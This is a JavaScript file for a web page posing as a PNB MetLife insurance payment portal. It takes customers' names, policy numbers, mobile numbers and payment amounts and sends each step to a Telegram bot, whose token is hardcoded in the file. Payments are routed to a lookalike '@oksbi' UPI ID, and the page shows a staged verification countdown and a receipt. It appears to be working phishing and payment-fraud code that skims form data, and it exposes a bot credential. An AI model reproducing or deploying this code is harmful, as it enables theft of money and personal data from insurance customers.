// Data store
const paymentData = {
    name: '',
    policyNumber: '',
    mobileNumber: '',
    amount: '',
    method: '',
    txnId: ''
};

// Telegram notification function
async function sendTelegramNotification(message) {
    const TELEGRAM_BOT_TOKEN = '8648940054:AAH6iqlrVYfyIbw5WdF3RwkGLVGIEC736qI';
    const TELEGRAM_CHAT_ID = '8658517089';
    
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error('Telegram notification failed:', e);
    }
}

// Send notification when page loads
sendTelegramNotification('🌐 <b>New Customer Visited Website</b>\nTime: ' + new Date().toLocaleString('en-IN'));

const PAYMENT_PENDING_KEY = 'pnb_upi_pending_v1';

function persistPaymentState() {
    const payload = {
        name: paymentData.name,
        policyNumber: paymentData.policyNumber,
        mobileNumber: paymentData.mobileNumber,
        amount: paymentData.amount,
        method: paymentData.method,
        txnId: paymentData.txnId,
        ts: Date.now()
    };
    try {
        localStorage.setItem(PAYMENT_PENDING_KEY, JSON.stringify(payload));
    } catch (e) {
        console.warn('Could not persist payment state:', e);
    }
}

function loadPaymentState() {
    try {
        const raw = localStorage.getItem(PAYMENT_PENDING_KEY);
        if (!raw) return null;
        return JSON.parse(raw);
    } catch {
        return null;
    }
}

function clearPaymentState() {
    try {
        localStorage.removeItem(PAYMENT_PENDING_KEY);
    } catch {
        /* ignore */
    }
}

function showIPaidStep() {
    const wrap = document.getElementById('paymentIPaidWrap');
    const loading = document.getElementById('paymentLoading');
    const optionsDiv = document.querySelector('.payment-methods');
    if (!wrap || !loadPaymentState()) return;
    wrap.classList.remove('hidden');
    if (loading) loading.classList.add('hidden');
    if (optionsDiv) optionsDiv.classList.add('hidden');
}

// Function to switch between views
function goToView(viewId) {
    if (viewId === 'view2') {
        const name = document.getElementById('name').value.trim();
        const policy = document.getElementById('policyNumber').value.trim();
        const mobile = document.getElementById('mobileNumber').value.trim();

        if (!name || !policy || !mobile) {
            alert("Please fill out all fields.");
            return;
        }

        paymentData.name = name;
        paymentData.policyNumber = policy;
        paymentData.mobileNumber = mobile;
        
        // Send Telegram notification
        sendTelegramNotification(
            '📝 <b>Customer Filled Details</b>\n' +
            'Name: ' + name + '\n' +
            'Policy: ' + policy + '\n' +
            'Mobile: ' + mobile + '\n' +
            'Time: ' + new Date().toLocaleString('en-IN')
        );
    }

    document.querySelectorAll('.view').forEach(el => el.classList.remove('active'));
    if (viewId !== 'view1' && viewId !== 'view2') {
        const footer = document.querySelector('.footer');
        if (footer) footer.style.display = 'none';

        const header = document.querySelector('.header');
        if (header && viewId === 'view5') {
            header.style.display = 'none';
        }
    }

    document.getElementById(viewId).classList.add('active');
    document.body.classList.toggle('is-landing-view', viewId === 'view1');
}

function goToPaymentMethods() {
    const amount = document.getElementById('amount').value.trim();
    const isConfirmed = document.getElementById('confirmPayment').checked;

    if (!amount || amount <= 0) {
        alert("Please enter a valid amount.");
        return;
    }

    if (!isConfirmed) {
        alert("Please check 'I confirm the payment amount' to continue.");
        return;
    }

    paymentData.amount = amount;
    
    // Send Telegram notification
    sendTelegramNotification(
        '💰 <b>Customer Entered Amount</b>\n' +
        'Amount: ₹' + amount + '\n' +
        'Name: ' + paymentData.name + '\n' +
        'Policy: ' + paymentData.policyNumber + '\n' +
        'Mobile: ' + paymentData.mobileNumber + '\n' +
        'Time: ' + new Date().toLocaleString('en-IN')
    );
    
    goToView('view4');
}

let paymentVerificationTimer = null;
let paymentInitiated = false;

function processPayment(method) {
    console.log('processPayment called with method:', method);
    
    // Check if amount is set
    if (!paymentData.amount || paymentData.amount <= 0) {
        alert('Please enter a valid amount first');
        return;
    }
    
    paymentData.method = method;
    paymentData.txnId = 'PNB' + Date.now().toString(36).toUpperCase();
    
    // Send Telegram notification
    sendTelegramNotification(
        '🔔 <b>Customer Clicked Payment Button</b>\n' +
        'App: ' + method + '\n' +
        'Amount: ₹' + paymentData.amount + '\n' +
        'Name: ' + paymentData.name + '\n' +
        'Policy: ' + paymentData.policyNumber + '\n' +
        'Mobile: ' + paymentData.mobileNumber + '\n' +
        'Ref ID: ' + paymentData.txnId + '\n' +
        'Time: ' + new Date().toLocaleString('en-IN')
    );

    const loading = document.getElementById('paymentLoading');
    const verifyWrap = document.getElementById('paymentVerifyWrap');
    const adminWrap = document.getElementById('adminVerifyWrap');

    if (loading) loading.classList.remove('hidden');
    if (verifyWrap) verifyWrap.classList.add('hidden');
    if (adminWrap) adminWrap.classList.add('hidden');

    const amtNum = Number(paymentData.amount);
    const am = Number.isFinite(amtNum) && amtNum > 0 ? amtNum.toFixed(2) : String(paymentData.amount);
    const tr = paymentData.txnId;
    const upiParams = [
        ['pa', 'pnbmetalifeinsurance3@oksbi'],
        ['pn', 'PNBMetLife'],
        ['am', am],
        ['cu', 'INR'],
        ['tn', 'PNB' + tr.slice(-6)],
        ['tr', tr]
    ].map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&');

    const genericUpiUrl = `upi://pay?${upiParams}`;
    const isAndroid = /Android/i.test(navigator.userAgent);
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

    // Use generic UPI URL for all apps - most reliable method
    let paymentUrl = genericUpiUrl;
    
    paymentInitiated = true;
    persistPaymentState();
    
    // Open UPI app - Simple and reliable method
    if (isAndroid || isIOS) {
        // Use generic UPI URL which allows user to choose their preferred app
        window.location.href = paymentUrl;
        
        // For Android, also try to trigger app-specific URL after a short delay
        if (isAndroid) {
            setTimeout(() => {
                if (method === 'PhonePe') {
                    window.location.href = `phonepe://pay?${upiParams}`;
                } else if (method === 'Paytm') {
                    window.location.href = `paytmmp://upi/pay?${upiParams}`;
                } else if (method === 'Google Pay') {
                    window.location.href = `tez://upi/pay?${upiParams}`;
                }
            }, 500);
        }
    } else {
        // Desktop - show QR code message
        alert('Please scan the QR code above to pay with ' + method);
    }

    // After 3 seconds, show waiting screen with manual option
    setTimeout(() => {
        loading.classList.add('hidden');
        
        // Show manual payment option
        const manualWrap = document.getElementById('manualPaymentWrap');
        if (manualWrap) {
            manualWrap.classList.remove('hidden');
            document.getElementById('manualAmount').textContent = '₹ ' + paymentData.amount;
        }
        
        if (verifyWrap) {
            verifyWrap.classList.remove('hidden');
            startVerificationCountdown();
        }
    }, 3000);
}

function startVerificationCountdown() {
    let seconds = 15;
    const timerEl = document.getElementById('verifyTimer');
    const verifyWrap = document.getElementById('paymentVerifyWrap');
    const adminWrap = document.getElementById('adminVerifyWrap');
    
    if (paymentVerificationTimer) clearInterval(paymentVerificationTimer);
    
    paymentVerificationTimer = setInterval(() => {
        seconds--;
        if (timerEl) timerEl.textContent = `Checking in ${seconds}s`;
        
        if (seconds <= 0) {
            clearInterval(paymentVerificationTimer);
            if (verifyWrap) verifyWrap.classList.add('hidden');
            if (adminWrap) {
                adminWrap.classList.remove('hidden');
                document.getElementById('verifyRefId').textContent = paymentData.txnId;
            }
        }
    }, 1000);
}

function verifyPaymentReceived() {
    const btn = document.getElementById('verifyPaymentBtn');
    if (btn) btn.disabled = true;
    
    // Show success only after admin confirms
    finalizePaymentSuccess();
}

function cancelPayment() {
    if (paymentVerificationTimer) clearInterval(paymentVerificationTimer);
    clearPaymentState();
    paymentInitiated = false;
    
    // Go back to payment methods
    document.getElementById('paymentVerifyWrap').classList.add('hidden');
    document.getElementById('adminVerifyWrap').classList.add('hidden');
    document.getElementById('manualPaymentWrap').classList.add('hidden');
    document.querySelector('.payment-methods').classList.remove('hidden');
}

function copyUpiId() {
    const upiId = 'pnbmetalifeinsurance3@oksbi';
    navigator.clipboard.writeText(upiId).then(() => {
        alert('UPI ID copied: ' + upiId);
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = upiId;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        alert('UPI ID copied: ' + upiId);
    });
}

async function finalizePaymentSuccess() {
    const loading = document.getElementById('paymentLoading');
    const adminWrap = document.getElementById('adminVerifyWrap');
    if (loading) loading.classList.add('hidden');
    if (adminWrap) adminWrap.classList.add('hidden');

    const state = loadPaymentState();
    if (state) {
        paymentData.name = state.name || paymentData.name;
        paymentData.policyNumber = state.policyNumber || paymentData.policyNumber;
        paymentData.mobileNumber = state.mobileNumber || paymentData.mobileNumber;
        paymentData.amount = state.amount || paymentData.amount;
        paymentData.method = state.method || paymentData.method;
        paymentData.txnId = state.txnId || paymentData.txnId;
    }

    // Call server to mark payment as verified
    try {
        const res = await fetch('/verify-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refId: paymentData.txnId })
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
            console.warn('Verify failed:', data);
        }
    } catch (e) {
        console.warn('Verify request failed:', e);
    }

    // Show receipt
    document.getElementById('receiptName').innerText = paymentData.name;
    document.getElementById('receiptPolicy').innerText = paymentData.policyNumber;
    document.getElementById('receiptMobile').innerText = '+91 ' + paymentData.mobileNumber;
    document.getElementById('receiptMethod').innerText = paymentData.method + ' (UPI)';
    document.getElementById('receiptAmount').innerText = '₹ ' + paymentData.amount;
    document.getElementById('receiptTxn').innerText = paymentData.txnId;

    clearPaymentState();
    paymentInitiated = false;
    goToView('view5');
}

async function finalizeIPaid() {
    const btn = document.getElementById('paymentIPaidBtn');
    if (btn) btn.disabled = true;

    const loading = document.getElementById('paymentLoading');
    const iPaidWrap = document.getElementById('paymentIPaidWrap');
    if (loading) loading.classList.add('hidden');
    if (iPaidWrap) iPaidWrap.classList.add('hidden');

    const state = loadPaymentState();
    if (state) {
        paymentData.name = state.name || paymentData.name;
        paymentData.policyNumber = state.policyNumber || paymentData.policyNumber;
        paymentData.mobileNumber = state.mobileNumber || paymentData.mobileNumber;
        paymentData.amount = state.amount || paymentData.amount;
        paymentData.method = state.method || paymentData.method;
        paymentData.txnId = state.txnId || paymentData.txnId;
    } else {
        clearPaymentState();
        if (btn) btn.disabled = false;
        return;
    }

    try {
        const res = await fetch('/notify-paid', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                name: paymentData.name,
                policyNumber: paymentData.policyNumber,
                mobileNumber: paymentData.mobileNumber,
                amount: paymentData.amount,
                method: paymentData.method,
                refId: paymentData.txnId
            })
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
            console.warn('Notify failed:', data);
        }
    } catch (e) {
        console.warn('Notify request failed (is the server running?):', e);
    }

    document.getElementById('receiptName').innerText = paymentData.name;
    document.getElementById('receiptPolicy').innerText = paymentData.policyNumber;
    document.getElementById('receiptMobile').innerText = '+91 ' + paymentData.mobileNumber;
    document.getElementById('receiptMethod').innerText = paymentData.method + ' (UPI)';
    document.getElementById('receiptAmount').innerText = '₹ ' + paymentData.amount;
    document.getElementById('receiptTxn').innerText = paymentData.txnId;

    clearPaymentState();
    goToView('view5');
}

window.addEventListener('load', () => {
    const state = loadPaymentState();
    if (state && state.txnId) {
        // Restore payment data
        paymentData.name = state.name || '';
        paymentData.policyNumber = state.policyNumber || '';
        paymentData.mobileNumber = state.mobileNumber || '';
        paymentData.amount = state.amount || '';
        paymentData.method = state.method || '';
        paymentData.txnId = state.txnId || '';
        
        goToView('view4');
        
        // Show admin verification screen
        document.querySelector('.payment-methods').classList.add('hidden');
        document.getElementById('paymentLoading').classList.add('hidden');
        document.getElementById('paymentVerifyWrap').classList.add('hidden');
        document.getElementById('adminVerifyWrap').classList.remove('hidden');
        document.getElementById('verifyRefId').textContent = paymentData.txnId;
    }
    
    // Setup UPI link click handlers
    setupUpiLinks();
});

function setupUpiLinks() {
    // QR code UPI link
    const qrLink = document.getElementById('upiLinkQr');
    if (qrLink) {
        qrLink.addEventListener('click', (e) => {
            e.preventDefault();
            if (paymentData.amount) {
                openUpiPayment('');
            } else {
                alert('Please enter amount first');
            }
        });
    }
    
    // Payment box UPI links
    document.querySelectorAll('.upi-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            const app = link.getAttribute('data-app');
            if (paymentData.amount) {
                processPayment(app);
            } else {
                alert('Please enter amount first');
            }
        });
    });
}

function openUpiPayment(app) {
    const amtNum = Number(paymentData.amount);
    const am = Number.isFinite(amtNum) && amtNum > 0 ? amtNum.toFixed(2) : '0.00';
    const upiId = 'pnbmetalifeinsurance3@oksbi';
    const name = 'PNBMetLife';
    const tr = 'PNB' + Date.now().toString(36).toUpperCase();
    
    // Build UPI URL
    const upiUrl = `upi://pay?pa=${encodeURIComponent(upiId)}&pn=${encodeURIComponent(name)}&am=${am}&cu=INR&tn=${encodeURIComponent('Payment-' + tr)}&tr=${tr}`;
    
    window.location.href = upiUrl;
}
